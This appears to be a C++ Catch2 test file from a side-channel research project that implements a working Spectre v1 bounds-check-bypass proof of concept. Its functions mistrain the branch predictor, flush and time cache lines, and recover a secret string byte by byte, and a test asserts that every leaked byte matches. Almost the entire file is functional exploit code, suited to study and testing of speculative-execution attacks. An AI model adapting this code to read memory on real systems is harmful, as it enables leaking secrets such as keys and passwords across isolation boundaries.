//
// Created by sage on 1/12/21.
//
#include <catch2/catch.hpp>
#include <stdafx.h>
#include <cacheutils.h>
#include <Spectrev1.h>

unsigned int array1_size = 16;
uint8_t unused[64]; // seperate by a cacheline
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64]; // seperate by a cacheline
uint8_t array2[MAX_BYTE*BLOCK_LEN];

char* secret = "The cake is a lie!";

volatile uint8_t get_elem(size_t x)
{
    // Make this volatile or compiler might optimize out
    volatile uint8_t res = 0;
    if (x < array1_size)
    {
        res &= array2[array1[x]*BLOCK_LEN];
    }
    return res;
}

//void mistrain(int arr_size, int num_trainings, size_t train_x, size_t mal_x)
//{
//    size_t x;
//    for (auto i = num_trainings-1; i >= 0; --i)
//    {
//        // Flush things that need to not be in the cache for spec exec
//        flush(&array1_size);
//
//        // If i % (num_trainings+1) == 0 then x := mal_x else x := train_x
//        x = ((i % (num_trainings+1)) - 1) & ~0xFFFF;
//        x = (x | (x >> arr_size));
//        x = train_x ^ (x & (mal_x ^ train_x));
//        get_elem(x);
//    }
//}

int map(size_t i, size_t num_trainings)
{
    size_t x = (i % (num_trainings+1));
    volatile uint64_t swapped;
    asm volatile("bswap %0;" : "=R"(swapped): "R"(x));
    x = (x - 1)/( swapped + 1);
    return x;
}

void mistrain(int num_trainings, size_t train_x, size_t mal_x)
{
    uint64_t x;
    for (auto i = 3*num_trainings-1; i >= 0; --i)
    {
        // Flush things that need to not be in the cache for spec exec
        flush(&array1_size);
        // Set x to mal_x when i % (num_trainings+1) == 0
        x = (i % (num_trainings+1));
        x = (x-1)/(x+1);
        x = train_x ^ (x & (mal_x ^ train_x));

        get_elem(x);
    }
}

void find_hits(int* results, size_t train_x)
{
    for (auto i = 0; i < MAX_BYTE; ++i)
    {
        int mix_i = MIX(i);
        if ( is_hit(load(MEM_ADD(array2, mix_i*BLOCK_LEN))) && mix_i != array1[train_x] )
        {
            results[mix_i]++;
        }
    }
}

void readMemByte(size_t mal_x, uint8_t value[2], int score[2])
{
    static int results[MAX_BYTE];
    int high, high2;

    memset(results, 0, sizeof(results));

    for (int tries = MAX_TRIES; tries > 0; --tries)
    {
        // Flush array2 from cache
        for (auto i = 0; i < MAX_BYTE; ++i)
            flush(MEM_ADD(array2, i*BLOCK_LEN));

        // Mistrain the branch predictor
        size_t train_x = tries % array1_size;

        mistrain(27, train_x, mal_x);

        // Time reads
        find_hits(results, train_x);

        // Locate highest and second highest result
        high = high2 = -1;
        for (auto i = 0; i < MAX_BYTE; ++i)
        {
            if (high < 0 || results[i] >= results[high])
            {
                high2 = high;
                high = i;
            }
            else if (high2 < 0 || results[i] >= results[high2])
            {
                high2 = i;
            }
        }
        if (results[high] >= (2*results[high2] + 5) ||
            (results[high] == 2 && results[high2] == 0))
            break;
    }
    value[0] = (uint8_t)high;
    score[0] = results[high];
    value[1] = (uint8_t)high2;
    score[1] = results[high2];
}

void print_res(int score[2], uint8_t value[2])
{
    printf("0x%02X = %c score=%d   ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
        printf("second best: 0x%02X score=%d", value[1], score[1]);
    printf("\n");
}

TEST_CASE("spectrev1", "[branch]")
{
    // Compute malicious x
    size_t mal_x = (size_t)(secret - (char*)array1);
    int score[2];
    uint8_t value[2];

    // Make sure memory is backed
    memset(array2, 1, sizeof(array2));

    for (const auto &c : std::string(secret))
    {
        readMemByte(mal_x++, value, score);
        print_res(score, value);
        REQUIRE(value[0] == c);
        REQUIRE(score[0] >= 2*score[1]);
    }
}

TEST_CASE("mistrain", "[.branch]")
{
    mistrain(24, 3,  0xab);
}

TEST_CASE("map to 1 and 0", "[.mispredict]")
{
    int n_trainings = 128;
//    for (size_t i = n_trainings; i > 0; --i)
//    {
//        REQUIRE(map(i, n_trainings) == 0);
//    }
    REQUIRE((map(INT32_MAX, n_trainings)) == 0);
    REQUIRE((map(INT32_MAX-1, n_trainings)) == 0);
    REQUIRE((map(INT32_MAX-2, n_trainings)) == 0);
    REQUIRE((map(n_trainings, n_trainings)) == 0);
    REQUIRE((map(n_trainings-1, n_trainings)) == 0);
    REQUIRE((map(2, n_trainings)) == 0);
    REQUIRE((map(1, n_trainings)) == 0);
    REQUIRE((map(0, n_trainings)) == -1);
}
